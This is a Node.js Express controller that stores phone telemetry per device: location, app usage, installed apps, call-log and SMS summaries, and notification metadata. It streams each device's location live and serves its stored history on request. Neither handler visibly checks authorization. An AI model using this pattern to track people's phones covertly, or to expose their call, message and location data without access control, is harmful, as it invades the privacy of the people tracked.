const Telemetry = require('../models/telemetry.model');
const Device = require('../models/device.model');

exports.receive = async (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const payload = req.body;
    const t = new Telemetry({
      deviceId,
      ts: payload.ts ? new Date(payload.ts) : new Date(),
      location: payload.location,
      appsUsage: payload.appsUsage,
      installedApps: payload.installedApps,
      callLogSummary: payload.callLogSummary,
      smsSummary: payload.smsSummary,
      notificationsMeta: payload.notificationsMeta
    });
    await t.save();
    await Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date() });

    const io = req.app.get('io');
    io.to(`device_${deviceId}`).emit('telemetry', {
      deviceId,
      ts: t.ts,
      location: t.location,
      telemetryId: t._id
    });
    res.json({ ok: true, id: t._id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'save_failed' });
  }
};

exports.history = async (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const { from, to } = req.query;
    const q = { deviceId };
    if (from || to) q.ts = {};
    if (from) q.ts.$gte = new Date(from);
    if (to) q.ts.$lte = new Date(to);
    const docs = await Telemetry.find(q).sort({ ts: 1 }).limit(2000);
    res.json(docs);
  } catch (err) { console.error(err); res.status(500).json({ error: 'server_error' }); }
};
